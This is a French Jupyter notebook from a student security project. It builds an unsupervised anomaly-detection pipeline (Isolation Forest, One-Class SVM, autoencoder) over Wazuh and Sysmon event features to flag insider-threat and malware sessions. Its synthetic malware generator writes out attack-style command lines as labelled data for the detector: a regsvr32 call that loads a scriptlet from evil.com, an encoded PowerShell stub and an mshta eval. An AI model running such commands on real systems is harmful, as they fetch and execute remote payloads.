# Système UEBA Portable — Détection Insider Threat & Malware
## Pipeline Machine Learning Non Supervisé

---

**Projet de Fin d'Études (PFE)**  
**Cires Technologies — Tanger Med Group**  

### Architecture ML
```
alerts.json (Wazuh)
      │
      ▼
Feature Engineering
      │
      ▼
StandardScaler
      │
    ┌─┴─────────────────────────┐
    ▼           ▼               ▼
Isolation    One-Class      Autoencoder
Forest        SVM           (Deep Learning)
    └─┬─────────────────────────┘
      ▼
Vote Majoritaire (≥2/3)
      │
      ▼
Alerte UEBA
```

### Event IDs surveillés
| ID | Source | Description |
|----|--------|-------------|
| 4624 | Security | Login réussi |
| 4625 | Security | Login échoué |
| 4634 | Security | Déconnexion |
| 4688 / 1 | Security / Sysmon | Processus créé |
| 4663 / 11 | Security / Sysmon | Fichier accédé |
| 3 | Sysmon | Connexion réseau |
| 13 | Sysmon | Registre modifié |
| 22 | Sysmon | Requête DNS |

## 1. Installation des librairies

In [ ]:
import subprocess, sys, os

# ════════════════════════════════════════════════════════════════
# CONFIGURATION — dépôt & branche à utiliser sur Google Colab
#   Pointez sur le dépôt + la branche qui contiennent les CORRECTIFS.
#   (Tant qu'ils ne sont pas sur la branche par défaut du dépôt
#    d'origine, gardez ici la branche qui les contient.)
# ════════════════════════════════════════════════════════════════
REPO_URL    = 'https://github.com/linalaaraich/pfe-ueba-ml.git'
REPO_BRANCH = 'audit/ueba-system-review'
REPO_DIR    = '/content/pfe-ueba-ml'

# ── Détection de l'environnement ─────────────────────────────────
try:
    import google.colab  # noqa: F401
    IN_COLAB = True
except ImportError:
    IN_COLAB = False

print(f'Environnement : {"Google Colab" if IN_COLAB else "Local"}')


def _run(cmd):
    """Exécute une commande et LÈVE une erreur claire si elle échoue
    (l'ancienne cellule continuait après un clone raté → erreurs obscures)."""
    res = subprocess.run(cmd, capture_output=True, text=True)
    if res.returncode != 0:
        raise RuntimeError(
            f"Échec : {' '.join(cmd)}\n"
            f"--- stdout ---\n{res.stdout}\n--- stderr ---\n{res.stderr}"
        )
    return res


if IN_COLAB:
    if not os.path.isdir(os.path.join(REPO_DIR, '.git')):
        print(f'Clonage de {REPO_URL} (branche {REPO_BRANCH})...')
        _run(['git', 'clone', '--quiet', '--branch', REPO_BRANCH, REPO_URL, REPO_DIR])
    else:
        print('Dépôt déjà présent — mise à jour sur la bonne branche...')
        _run(['git', '-C', REPO_DIR, 'fetch', '--quiet', 'origin', REPO_BRANCH])
        _run(['git', '-C', REPO_DIR, 'checkout', '--quiet', REPO_BRANCH])
        _run(['git', '-C', REPO_DIR, 'pull', '--quiet', 'origin', REPO_BRANCH])
    os.chdir(REPO_DIR)
    print(f'Répertoire de travail : {os.getcwd()}')
    # build-backend corrigé (setuptools.build_meta) → `pip install -e .` marche
    _run([sys.executable, '-m', 'pip', 'install', '-q', '-e', '.'])
else:
    # Local : on suppose `pip install -e .` déjà fait à la racine du dépôt.
    print('Mode local — dépendances supposées déjà installées.')
    # Pour (ré)installer : décommentez la ligne suivante.
    # _run([sys.executable, '-m', 'pip', 'install', '-q', '-e', '.'])

print('\n✓ Environnement prêt')


## 2. Import des librairies

In [ ]:
import sys, os
from pathlib import Path

# ── Détection de l'environnement et racine du repo ───────────────
try:
    import google.colab  # noqa: F401
    IN_COLAB = True
except ImportError:
    IN_COLAB = False

# Trouve la racine du repo (qui contient src/ueba) de façon robuste, puis ajoute
# src/ au PYTHONPATH dans TOUS les cas — ainsi `import ueba` marche même si
# `pip install -e .` n'a pas pris (cause classique de "No module named 'ueba'").
def _find_repo_root():
    candidates = [Path('/content/pfe-ueba-ml'), Path.cwd(), Path('..').resolve()]
    candidates += list(Path.cwd().parents)
    for cand in candidates:
        if (cand / 'src' / 'ueba' / '__init__.py').exists():
            return cand
    return Path('/content/pfe-ueba-ml') if IN_COLAB else Path('..').resolve()

REPO_ROOT = _find_repo_root()
_src = str(REPO_ROOT / 'src')
if _src not in sys.path:
    sys.path.insert(0, _src)

# ── Librairies standard ───────────────────────────────────────────
import json
import math
import random
import warnings
from collections import defaultdict
from datetime import datetime, timedelta

warnings.filterwarnings('ignore')

# ── Data science ──────────────────────────────────────────────────
import numpy as np
import pandas as pd
from scipy import stats

# ── Visualisation ─────────────────────────────────────────────────
import matplotlib.pyplot as plt
import seaborn as sns
import plotly.express as px
import plotly.graph_objects as go
from plotly.subplots import make_subplots

# ── Machine Learning ──────────────────────────────────────────────
from sklearn.ensemble import IsolationForest
from sklearn.svm import OneClassSVM
from sklearn.preprocessing import StandardScaler
from sklearn.metrics import classification_report, confusion_matrix
import joblib

# ── Deep Learning ─────────────────────────────────────────────────
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers, Model
from tensorflow.keras.callbacks import EarlyStopping, ReduceLROnPlateau

# ── Package UEBA (installé via pip install -e .) ─────────────────
try:
    from ueba.features.parse_logs import parse_alerts_to_dataframe, add_zscores
    _UEBA_PKG = True
except ImportError:
    _UEBA_PKG = False
    print('[WARN] Package ueba non trouvé — les fonctions seront définies inline.')

# ── Reproductibilité ──────────────────────────────────────────────
SEED = 42
np.random.seed(SEED)
random.seed(SEED)
tf.random.set_seed(SEED)

# ── Style graphique (compatible toutes versions matplotlib) ───────
try:
    plt.style.use('seaborn-v0_8-whitegrid')
except OSError:
    try:
        plt.style.use('seaborn-whitegrid')
    except OSError:
        plt.style.use('ggplot')

sns.set_palette('husl')
COLORS = {'normal': '#2ecc71', 'anomaly': '#e74c3c', 'neutral': '#3498db'}

print(f'Environnement  : {"Google Colab" if IN_COLAB else "Local"}')
print(f'Repo root      : {REPO_ROOT}')
print(f'TensorFlow     : {tf.__version__}')
print(f'scikit-learn   : {__import__("sklearn").__version__}')
print(f'NumPy          : {np.__version__}')
print(f'Pandas         : {pd.__version__}')
print(f'Package ueba   : {"✓ importé" if _UEBA_PKG else "✗ inline fallback"}')
print('\n✓ Imports OK')


## 3. Chargement et parsing de alerts.json (Wazuh)

In [ ]:
# ═══════════════════════════════════════════════════════════════
# CONFIGURATION — Modifier uniquement cette cellule
# ═══════════════════════════════════════════════════════════════

#  False → Données synthétiques (pipeline testable sans Wazuh)
#  True  → Charge data/dataset.csv exporté par parse_logs.py
USE_REAL_DATA = False

# Chemins automatiquement calculés depuis REPO_ROOT
DATASET_CSV     = str(REPO_ROOT / 'data'   / 'dataset.csv')
MODELS_DIR      = str(REPO_ROOT / 'models')
WORK_HOUR_START = 9
WORK_HOUR_END   = 18
SESSION_MINUTES = 60

os.makedirs(MODELS_DIR, exist_ok=True)
print(f'Repo root          : {REPO_ROOT}')
print(f'Mode données       : {"RÉELLES — " + DATASET_CSV if USE_REAL_DATA else "SYNTHÉTIQUES"}')
print(f'Répertoire modèles : {MODELS_DIR}')

# ── Hyperparamètres de détection depuis config.yaml (source unique, audit RC-3) ──
try:
    from ueba.config import get_config
    _DET = get_config().get('detection', {})
except Exception:
    _DET = {}
CONTAMINATION = _DET.get('contamination', 0.01)
OCSVM_NU      = _DET.get('ocsvm_nu', 0.01)
OCSVM_GAMMA   = _DET.get('ocsvm_gamma', 0.01)
AE_SIGMA      = _DET.get('ae_threshold_sigma', 3.0)
AE_PCT        = _DET.get('ae_threshold_percentile', 99.0)
print(f'Détection (config) : contamination={CONTAMINATION} nu={OCSVM_NU} gamma={OCSVM_GAMMA} ae_sigma={AE_SIGMA}')


In [ ]:
# Constantes locales — filet de sécurité si cellule exécutée hors ordre
_WORK_HOUR_START = globals().get('WORK_HOUR_START', 9)
_WORK_HOUR_END   = globals().get('WORK_HOUR_END',   18)


def simulate_normal_session(user='user_normal', base_date=None):
    """Génère une session de comportement normal simulé."""
    if base_date is None:
        base_date = datetime(2024, 1, 15, 9, 0)

    offset_days  = random.randint(0, 4)          # Lundi à vendredi
    offset_hours = random.uniform(0, 9)          # 9h-18h
    ts       = base_date + timedelta(days=offset_days, hours=offset_hours)
    nb_files = random.randint(1, 30)
    duration = random.uniform(5, 120)

    return {
        'timestamp':            ts.isoformat(),
        'username':             user,
        'hour':                 ts.hour,
        'is_night':             0,
        'is_weekend':           0,
        'nb_files_accessed':    nb_files,
        'nb_sensitive_files':   random.randint(0, 2),
        'nb_failed_logins':     random.randint(0, 1),
        'nb_processes':         random.randint(3, 15),
        'bytes_sent':           random.randint(1_000, 50_000),
        'new_ip':               0,
        'sensitive_path_access': 0,
        'process_name':         random.choice(['explorer.exe','chrome.exe','outlook.exe',
                                               'word.exe','excel.exe','teams.exe']),
        'command_line':         '',
        'velocity':             round(nb_files / max(duration, 1), 4),
        'entropy_commands':     round(random.uniform(0, 1.5), 4),
        'session_duration_min': round(duration, 2),
        'label': 0,
    }


def simulate_insider_threat_session(user='user_normal', base_date=None):
    """Génère une session d'Insider Threat simulée."""
    if base_date is None:
        base_date = datetime(2024, 1, 15)

    is_night   = random.random() > 0.4
    is_weekend = random.random() > 0.5
    hour = random.randint(0, 7) if is_night else random.randint(9, 18)
    ts   = base_date + timedelta(
        days=random.choice([5, 6]) if is_weekend else random.randint(0, 4),
        hours=hour
    )
    nb_files = random.randint(50, 300)
    duration = random.uniform(10, 60)

    return {
        'timestamp':            ts.isoformat(),
        'username':             user,
        'hour':                 ts.hour,
        'is_night':             int(is_night),
        'is_weekend':           int(is_weekend),
        'nb_files_accessed':    nb_files,
        'nb_sensitive_files':   random.randint(20, 100),
        'nb_failed_logins':     random.randint(0, 3),
        'nb_processes':         random.randint(5, 30),
        'bytes_sent':           random.randint(100_000, 5_000_000),
        'new_ip':               random.randint(0, 1),
        'sensitive_path_access': 1,
        'process_name':         random.choice(['cmd.exe','powershell.exe','xcopy.exe',
                                               'robocopy.exe','7z.exe']),
        'command_line':         r'xcopy C:\Sensitive\ D:\backup\ /E /H',
        'velocity':             round(nb_files / max(duration, 1), 4),
        'entropy_commands':     round(random.uniform(2.0, 3.5), 4),
        'session_duration_min': round(duration, 2),
        'label': 1,
    }


def simulate_malware_session(user='user_normal', base_date=None):
    """Génère une session de Malware simulée."""
    if base_date is None:
        base_date = datetime(2024, 1, 15)

    ts   = base_date + timedelta(days=random.randint(0, 6), hours=random.randint(0, 23))
    hour = ts.hour

    return {
        'timestamp':            ts.isoformat(),
        'username':             user,
        'hour':                 hour,
        # Utiliser les constantes locales pour éviter NameError hors-ordre
        'is_night':             int(hour < _WORK_HOUR_START or hour >= _WORK_HOUR_END),
        'is_weekend':           int(ts.weekday() >= 5),
        'nb_files_accessed':    random.randint(10, 80),
        'nb_sensitive_files':   random.randint(0, 10),
        'nb_failed_logins':     random.randint(0, 2),
        'nb_processes':         random.randint(20, 100),
        'bytes_sent':           random.randint(50_000, 2_000_000),
        'new_ip':               1,
        'sensitive_path_access': random.randint(0, 1),
        'process_name':         random.choice(['powershell.exe','wscript.exe','mshta.exe',
                                               'regsvr32.exe','rundll32.exe']),
        'command_line':         random.choice([
            'powershell.exe -enc JABzAD0ATgBlAHcA...',
            'wscript.exe //B payload.vbs',
            'mshta.exe javascript:eval(atob(...))',
            'regsvr32 /s /n /u /i:http://evil.com/dropper.sct scrobj.dll',
        ]),
        'velocity':             round(random.uniform(5, 30), 4),
        'entropy_commands':     round(random.uniform(3.0, 5.0), 4),
        'session_duration_min': round(random.uniform(1, 30), 2),
        'label': 2,
    }


print('✓ Fonctions de simulation définies')


In [ ]:
if USE_REAL_DATA:
    # ── Mode données réelles ──────────────────────────────────────
    csv_path = Path(DATASET_CSV)
    if not csv_path.exists():
        raise FileNotFoundError(
            f"\nFichier introuvable : {DATASET_CSV}\n\n"
            "Pour générer dataset.csv depuis Wazuh (sur VM1) :\n"
            "  python -m ueba.features.parse_logs "
            "/var/ossec/logs/alerts/alerts.json\n\n"
            "Puis copier data/dataset.csv dans le repo "
            "(ou monter Google Drive sur Colab)."
        )

    df_normal = pd.read_csv(DATASET_CSV)

    required_cols = [
        'hour', 'is_night', 'is_weekend',
        'nb_files_accessed', 'nb_sensitive_files', 'nb_failed_logins',
        'nb_processes', 'bytes_sent', 'new_ip', 'sensitive_path_access',
        'process_name', 'command_line', 'velocity', 'entropy_commands',
    ]
    missing = [c for c in required_cols if c not in df_normal.columns]
    if missing:
        raise ValueError(f'Colonnes manquantes dans dataset.csv : {missing}')

    if 'label'     not in df_normal.columns:
        df_normal['label'] = 0
    if 'timestamp' in df_normal.columns:
        df_normal['timestamp'] = pd.to_datetime(df_normal['timestamp'], errors='coerce')

    print(f'[OK] {len(df_normal)} sessions chargées depuis {DATASET_CSV}')
    print(f'[OK] Utilisateurs : {df_normal["username"].unique().tolist()}')

else:
    # ── Mode synthétique : 300 sessions normales ──────────────────
    print('[INFO] USE_REAL_DATA = False — données synthétiques')
    print('[INFO] Pour utiliser vos vraies données :')
    print('  1. Sur VM1 : python -m ueba.features.parse_logs '
          '/var/ossec/logs/alerts/alerts.json')
    print('  2. Copier data/dataset.csv dans le repo')
    print('  3. Mettre USE_REAL_DATA = True\n')

    base = datetime(2024, 1, 15, 9, 0)
    df_normal = pd.DataFrame([
        simulate_normal_session(base_date=base) for _ in range(300)
    ])
    print(f'[OK] {len(df_normal)} sessions synthétiques générées')

print(f'\nShape : {df_normal.shape}')
df_normal.head()


## 4. Feature Engineering

In [ ]:
# ── add_zscores : utilise la version importée du package, sinon définition inline ──
if not callable(globals().get('add_zscores')):
    def add_zscores(df: pd.DataFrame) -> pd.DataFrame:
        """Z-scores par utilisateur (fallback inline si package non disponible)."""
        df = df.copy()
        for col, zcol in [('nb_files_accessed', 'z_score_files'),
                          ('nb_failed_logins',  'z_score_logins')]:
            if col in df.columns:
                df[zcol] = (
                    df.groupby('username')[col]
                    .transform(
                        lambda x: stats.zscore(x, ddof=1) if len(x) > 1
                        else pd.Series([0.0] * len(x), index=x.index)
                    )
                    .fillna(0.0).round(4)
                )
            else:
                df[zcol] = 0.0
        return df

# ── Calcul des z-scores sur le dataset normal ─────────────────────
if 'z_score_files' not in df_normal.columns:
    df_normal = add_zscores(df_normal)

# ── Features numériques utilisées par les modèles ML ─────────────
NUMERIC_FEATURES = [
    'hour', 'is_night', 'is_weekend',
    'nb_files_accessed', 'nb_sensitive_files',
    'nb_failed_logins', 'nb_processes',
    'bytes_sent', 'new_ip', 'sensitive_path_access',
    'z_score_files', 'z_score_logins',
    'velocity', 'entropy_commands',
]

# Initialiser à 0 les features éventuellement absentes
for f in NUMERIC_FEATURES:
    if f not in df_normal.columns:
        df_normal[f] = 0.0
        print(f'[WARN] Feature manquante initialisée à 0 : {f}')

print(f'✓ {len(NUMERIC_FEATURES)} features prêtes :')
for f in NUMERIC_FEATURES:
    print(f'  - {f}')


In [ ]:
# ═══ Baseline comportementale FIGÉE (corrige l'audit RC-1) ═══
# μ/σ par utilisateur calculés UNE fois sur le normal, FIGÉS dans
# models/baseline.json. Le daemon charge le MÊME fichier → z-scores cohérents
# entraînement↔service, et plus de "démarrage à froid" (fenêtre vide).
from ueba.features.baseline import (compute_baseline, apply_baseline_zscores,
                                     save_baseline, feature_health)

baseline = compute_baseline(df_normal)
save_baseline(baseline, f'{MODELS_DIR}/baseline.json')
df_normal = apply_baseline_zscores(df_normal, baseline)   # z-scores figés (cohérence train↔serve)
print(f'\u2713 Baseline figee: {len(baseline["per_user"])} utilisateur(s) -> {MODELS_DIR}/baseline.json')

# Santé des features : repère celles MORTES sur les vraies données (ex. bytes_sent,
# toujours 0 car Sysmon EID 3 ne porte pas de compteur d'octets — audit RC-2).
health = feature_health(df_normal, NUMERIC_FEATURES)
dead = [f for f, h in health.items() if h.get('dead')]
print('\u26a0\ufe0f  Features constantes/mortes (a retirer/re-sourcer sur donnees reelles):', dead
      if dead else 'aucune sur ce jeu')


## 5. Exploration et Visualisation des données

In [ ]:
# ─── Statistiques descriptives ───────────────────────────────────────────
print('=== Statistiques du dataset normal ===')
print(f'Nombre de sessions : {len(df_normal)}')
print(f'Période             : {df_normal["timestamp"].min()} → {df_normal["timestamp"].max()}')
print()
df_normal[NUMERIC_FEATURES].describe().round(3)

In [ ]:
fig, axes = plt.subplots(1, 2, figsize=(18, 7))

# ── Heatmap des corrélations ──────────────────────────────────────
corr = df_normal[NUMERIC_FEATURES].corr()
mask = np.triu(np.ones_like(corr, dtype=bool))
sns.heatmap(
    corr, mask=mask, ax=axes[0],
    cmap='RdYlGn', center=0, annot=True, fmt='.2f',
    square=True, linewidths=0.5, cbar_kws={'shrink': 0.8}
)
axes[0].set_title('Matrice de corrélation — Features UEBA', fontsize=13, fontweight='bold')

# ── Distribution horaire — reindex sur 24h pour que axvspan soit correct ──
hour_counts = (
    df_normal['hour']
    .value_counts()
    .reindex(range(24), fill_value=0)  # Garantit 24 barres aux bons indices
    .sort_index()
)
hour_counts.plot(kind='bar', ax=axes[1], color=COLORS['normal'], edgecolor='white', alpha=0.8)

_start = globals().get('WORK_HOUR_START', 9)
_end   = globals().get('WORK_HOUR_END',   18)
axes[1].axvspan(-0.5, _start - 0.5, alpha=0.15, color='red', label='Hors horaires')
axes[1].axvspan(_end  - 0.5, 23.5, alpha=0.15, color='red')
axes[1].set_title('Distribution horaire des sessions', fontsize=13, fontweight='bold')
axes[1].set_xlabel('Heure')
axes[1].set_ylabel('Nombre de sessions')
axes[1].legend()

plt.tight_layout()
plt.savefig('viz_correlation_heatmap.png', dpi=150, bbox_inches='tight')
plt.show()
print('✓ viz_correlation_heatmap.png')


In [ ]:
# ─── Distribution des features clés ─────────────────────────────────────
key_features = ['nb_files_accessed', 'nb_failed_logins', 'bytes_sent',
                'nb_processes', 'velocity', 'entropy_commands']

fig, axes = plt.subplots(2, 3, figsize=(16, 10))
axes = axes.flatten()

for i, feat in enumerate(key_features):
    if feat in df_normal.columns:
        data = df_normal[feat].dropna()
        axes[i].hist(data, bins=30, color=COLORS['normal'], edgecolor='white', alpha=0.8)
        axes[i].axvline(data.mean(), color='blue', linestyle='--', label=f'Moy: {data.mean():.1f}')
        axes[i].axvline(data.mean() + 2*data.std(), color='orange', linestyle=':', label='+2σ')
        axes[i].axvline(data.mean() + 3*data.std(), color='red', linestyle=':', label='+3σ')
        axes[i].set_title(feat, fontweight='bold')
        axes[i].set_xlabel('Valeur')
        axes[i].set_ylabel('Fréquence')
        axes[i].legend(fontsize=8)

plt.suptitle('Distribution des features UEBA — Comportement Normal', fontsize=14, fontweight='bold', y=1.02)
plt.tight_layout()
plt.savefig('viz_feature_distributions.png', dpi=150, bbox_inches='tight')
plt.show()
print('Visualisation enregistrée : viz_feature_distributions.png')

## 6. Normalisation (StandardScaler)

In [ ]:
# ─── Préparation des matrices X ──────────────────────────────────────────
X_normal = df_normal[NUMERIC_FEATURES].fillna(0).values.astype(np.float32)

print(f'X_normal shape : {X_normal.shape}')

# StandardScaler entraîné sur le comportement normal
scaler = StandardScaler()
X_scaled = scaler.fit_transform(X_normal)

print(f'Moyenne avant normalisation : {X_normal.mean(axis=0).round(2)}')
print(f'Moyenne après normalisation : {X_scaled.mean(axis=0).round(2)}')
print(f'Écart-type après normalisation : {X_scaled.std(axis=0).round(2)}')

# Sauvegarde du scaler
joblib.dump(scaler, f'{MODELS_DIR}/scaler.pkl')
print(f'\n✓ Scaler sauvegardé : {MODELS_DIR}/scaler.pkl')

## 7. Entraînement — Isolation Forest

In [ ]:
# ─── Isolation Forest ────────────────────────────────────────────────────
print('=== Entraînement Isolation Forest ===')
print('Objectif : Détecter les anomalies comportementales (Insider Threat + Malware)')
print()

iso_forest = IsolationForest(
    n_estimators=200,          # Nombre d'arbres
    contamination=CONTAMINATION,        # 5% d'anomalies supposées dans le jeu d'entraînement
    max_samples='auto',
    max_features=1.0,
    bootstrap=False,
    random_state=SEED,
    n_jobs=-1,
)

iso_forest.fit(X_scaled)

# Scores sur le dataset normal (pour analyse)
if_scores  = iso_forest.decision_function(X_scaled)   # Plus négatif = plus anomal
if_preds   = iso_forest.predict(X_scaled)             # -1 = anomalie, 1 = normal
if_anomaly_rate = (if_preds == -1).mean()

print(f'✓ Isolation Forest entraîné sur {len(X_scaled)} sessions')
print(f'  Taux d\'anomalie détecté : {if_anomaly_rate:.1%}')
print(f'  Score moyen            : {if_scores.mean():.4f}')
print(f'  Score min (pire)       : {if_scores.min():.4f}')

# Sauvegarde
joblib.dump(iso_forest, f'{MODELS_DIR}/isolation_forest.pkl')
print(f'\n✓ Modèle sauvegardé : {MODELS_DIR}/isolation_forest.pkl')

In [ ]:
# ─── Visualisation Isolation Forest ──────────────────────────────────────
fig, axes = plt.subplots(1, 2, figsize=(16, 6))

# Distribution des scores d'anomalie
colors_scores = [COLORS['anomaly'] if p == -1 else COLORS['normal'] for p in if_preds]
axes[0].hist(if_scores[if_preds == 1],  bins=30, alpha=0.7, color=COLORS['normal'],  label='Normal')
axes[0].hist(if_scores[if_preds == -1], bins=30, alpha=0.7, color=COLORS['anomaly'], label='Anomalie')
axes[0].axvline(0, color='black', linestyle='--', linewidth=1.5, label='Seuil (0)')
axes[0].set_title('Distribution des scores — Isolation Forest', fontweight='bold')
axes[0].set_xlabel('Anomaly Score')
axes[0].set_ylabel('Fréquence')
axes[0].legend()

# Scatter nb_files vs bytes_sent
idx_normal  = if_preds == 1
idx_anomaly = if_preds == -1
f1_idx = NUMERIC_FEATURES.index('nb_files_accessed')
f2_idx = NUMERIC_FEATURES.index('bytes_sent')

axes[1].scatter(X_scaled[idx_normal, f1_idx],  X_scaled[idx_normal, f2_idx],
                c=COLORS['normal'],  alpha=0.5, s=20, label='Normal')
axes[1].scatter(X_scaled[idx_anomaly, f1_idx], X_scaled[idx_anomaly, f2_idx],
                c=COLORS['anomaly'], alpha=0.8, s=40, marker='x', label='Anomalie IF')
axes[1].set_xlabel('nb_files_accessed (normalisé)')
axes[1].set_ylabel('bytes_sent (normalisé)')
axes[1].set_title('Isolation Forest — Détection sur données normales', fontweight='bold')
axes[1].legend()

plt.tight_layout()
plt.savefig('viz_isolation_forest.png', dpi=150, bbox_inches='tight')
plt.show()

## 8. Entraînement — One-Class SVM

In [ ]:
# ─── One-Class SVM ───────────────────────────────────────────────────────
print('=== Entraînement One-Class SVM ===')
print('Objectif : Détecter la compromission de compte (profil déviant de la norme)')
print()

# Sous-échantillonnage pour performance (OCSVM quadratique sur grands datasets)
max_samples_ocsvm = min(2000, len(X_scaled))
idx_sample = np.random.choice(len(X_scaled), max_samples_ocsvm, replace=False)
X_ocsvm    = X_scaled[idx_sample]

ocsvm = OneClassSVM(
    kernel='rbf',
    gamma=OCSVM_GAMMA,
    nu=OCSVM_NU,     # Proportion maximale d'anomalies attendues (5%)
)

ocsvm.fit(X_ocsvm)

# Prédictions sur tout le dataset normal
ocsvm_scores = ocsvm.decision_function(X_scaled)
ocsvm_preds  = ocsvm.predict(X_scaled)
ocsvm_anomaly_rate = (ocsvm_preds == -1).mean()

print(f'✓ One-Class SVM entraîné sur {max_samples_ocsvm} sessions (sous-échantillon)')
print(f'  Taux d\'anomalie détecté : {ocsvm_anomaly_rate:.1%}')
print(f'  Score moyen            : {ocsvm_scores.mean():.4f}')

# Sauvegarde
joblib.dump(ocsvm, f'{MODELS_DIR}/one_class_svm.pkl')
print(f'\n✓ Modèle sauvegardé : {MODELS_DIR}/one_class_svm.pkl')

In [ ]:
# ─── Visualisation One-Class SVM ─────────────────────────────────────────
fig, axes = plt.subplots(1, 2, figsize=(16, 6))

# Distribution des scores
axes[0].hist(ocsvm_scores[ocsvm_preds == 1],  bins=30, alpha=0.7, color=COLORS['normal'],  label='Normal')
axes[0].hist(ocsvm_scores[ocsvm_preds == -1], bins=30, alpha=0.7, color=COLORS['anomaly'], label='Anomalie')
axes[0].axvline(0, color='black', linestyle='--', linewidth=1.5, label='Frontière de décision')
axes[0].set_title('Distribution des scores — One-Class SVM', fontweight='bold')
axes[0].set_xlabel('Decision Score')
axes[0].set_ylabel('Fréquence')
axes[0].legend()

# Scatter is_night vs nb_failed_logins
night_idx = NUMERIC_FEATURES.index('is_night')
fail_idx  = NUMERIC_FEATURES.index('nb_failed_logins')

jitter = np.random.uniform(-0.1, 0.1, len(X_scaled))
idx_n = ocsvm_preds == 1
idx_a = ocsvm_preds == -1
axes[1].scatter(X_scaled[idx_n, night_idx] + jitter[idx_n], X_scaled[idx_n, fail_idx],
                c=COLORS['normal'],  alpha=0.4, s=20, label='Normal')
axes[1].scatter(X_scaled[idx_a, night_idx] + jitter[idx_a], X_scaled[idx_a, fail_idx],
                c=COLORS['anomaly'], alpha=0.8, s=40, marker='x', label='Anomalie OCSVM')
axes[1].set_xlabel('is_night (normalisé)')
axes[1].set_ylabel('nb_failed_logins (normalisé)')
axes[1].set_title('One-Class SVM — Espace de décision', fontweight='bold')
axes[1].legend()

plt.tight_layout()
plt.savefig('viz_ocsvm.png', dpi=150, bbox_inches='tight')
plt.show()

## 9. Entraînement — Autoencoder (Deep Learning)

In [ ]:
# ─── Architecture de l'Autoencoder ───────────────────────────────────────
print('=== Construction de l\'Autoencoder ===')
print('Objectif : Détecter les anomalies subtiles via erreur de reconstruction')
print()

INPUT_DIM  = len(NUMERIC_FEATURES)
LATENT_DIM = 4   # Espace latent compressé

def build_autoencoder(input_dim: int, latent_dim: int = 4) -> Model:
    """Autoencoder symétrique avec régularisation L2 et Dropout."""
    reg = keras.regularizers.l2(1e-4)

    # Encodeur
    inputs = keras.Input(shape=(input_dim,), name='input')
    x = layers.Dense(64, activation='relu', kernel_regularizer=reg, name='enc_1')(inputs)
    x = layers.BatchNormalization(name='bn_1')(x)
    x = layers.Dropout(0.2, name='drop_1')(x)
    x = layers.Dense(32, activation='relu', kernel_regularizer=reg, name='enc_2')(x)
    x = layers.BatchNormalization(name='bn_2')(x)
    x = layers.Dense(16, activation='relu', kernel_regularizer=reg, name='enc_3')(x)
    encoded = layers.Dense(latent_dim, activation='linear', name='latent')(x)

    # Décodeur (symétrique)
    x = layers.Dense(16, activation='relu', kernel_regularizer=reg, name='dec_1')(encoded)
    x = layers.Dense(32, activation='relu', kernel_regularizer=reg, name='dec_2')(x)
    x = layers.BatchNormalization(name='bn_3')(x)
    x = layers.Dropout(0.2, name='drop_2')(x)
    x = layers.Dense(64, activation='relu', kernel_regularizer=reg, name='dec_3')(x)
    outputs = layers.Dense(input_dim, activation='linear', name='output')(x)

    model = Model(inputs, outputs, name='ueba_autoencoder')
    model.compile(
        optimizer=keras.optimizers.Adam(learning_rate=1e-3),
        loss='mse',
        metrics=['mae'],
    )
    return model


autoencoder = build_autoencoder(INPUT_DIM, LATENT_DIM)
autoencoder.summary()

print(f'\nDimension d\'entrée : {INPUT_DIM}')
print(f'Espace latent      : {LATENT_DIM}')

In [ ]:
# ─── Entraînement de l'Autoencoder ───────────────────────────────────────

# Split train/validation (80/20)
split_idx = int(len(X_scaled) * 0.8)
X_train_ae = X_scaled[:split_idx]
X_val_ae   = X_scaled[split_idx:]

print(f'Train : {X_train_ae.shape} | Validation : {X_val_ae.shape}')

callbacks = [
    EarlyStopping(
        monitor='val_loss',
        patience=20,
        restore_best_weights=True,
        verbose=1,
    ),
    ReduceLROnPlateau(
        monitor='val_loss',
        factor=0.5,
        patience=10,
        min_lr=1e-6,
        verbose=1,
    ),
]

history = autoencoder.fit(
    X_train_ae, X_train_ae,          # Autoencoder : input = target
    validation_data=(X_val_ae, X_val_ae),
    epochs=200,
    batch_size=32,
    callbacks=callbacks,
    shuffle=True,
    verbose=1,
)

print(f'\n✓ Entraînement terminé après {len(history.history["loss"])} époques')
print(f'  Loss finale (train) : {history.history["loss"][-1]:.6f}')
print(f'  Loss finale (val)   : {history.history["val_loss"][-1]:.6f}')

In [ ]:
# ─── Calcul du seuil de reconstruction ───────────────────────────────────

# Reconstruction sur le dataset normal complet
X_reconstructed = autoencoder.predict(X_scaled, verbose=0)
reconstruction_errors = np.mean(np.power(X_scaled - X_reconstructed, 2), axis=1)

# Seuil calibré sur les erreurs de VALIDATION (non vues par les poids) :
# percentile robuste à l'asymétrie des erreurs → borne le taux de faux positifs
# à ~(100−AE_PCT) %. (μ+kσ sous-estimait le seuil → ~5-8% de FP — cf. audit.)
from ueba.features.baseline import calibrate_ae_threshold
_val_recon  = autoencoder.predict(X_val_ae, verbose=0)
_val_errors = np.mean(np.power(X_val_ae - _val_recon, 2), axis=1)
ae_threshold = calibrate_ae_threshold(
    _val_errors, percentile=AE_PCT,
    fallback_mean=reconstruction_errors.mean(),
    fallback_std=reconstruction_errors.std(), sigma=AE_SIGMA,
)

ae_preds = (reconstruction_errors > ae_threshold).astype(int)  # 1 = anomalie
ae_anomaly_rate = ae_preds.mean()

print(f'Erreur de reconstruction moyenne : {reconstruction_errors.mean():.6f}')
print(f'Erreur de reconstruction max     : {reconstruction_errors.max():.6f}')
print(f'Seuil d\'anomalie (μ + 3σ)        : {ae_threshold:.6f}')
print(f'Taux d\'anomalie sur données normales : {ae_anomaly_rate:.1%}')

# Sauvegarde du seuil
import json
with open(f'{MODELS_DIR}/ae_threshold.json', 'w') as f:
    json.dump({'threshold': float(ae_threshold)}, f)

# Sauvegarde des modèles
autoencoder.save(f'{MODELS_DIR}/autoencoder.keras')

print(f'\n✓ Autoencoder sauvegardé : {MODELS_DIR}/autoencoder.keras')
print(f'✓ Seuil sauvegardé       : {MODELS_DIR}/ae_threshold.json')
print('  (Le modèle Keras n\'est PAS picklé : .keras est le seul format fiable pour Keras 3)')


In [ ]:
fig, axes = plt.subplots(1, 2, figsize=(16, 6))

# ── Courbes d'entraînement ────────────────────────────────────────
axes[0].plot(history.history['loss'],     label='Train Loss',      color=COLORS['neutral'])
axes[0].plot(history.history['val_loss'], label='Validation Loss', color=COLORS['anomaly'],
             linestyle='--')
axes[0].set_title("Courbes d'entraînement — Autoencoder", fontweight='bold')
axes[0].set_xlabel('Époque')
axes[0].set_ylabel('MSE Loss')
axes[0].legend()
axes[0].set_yscale('log')

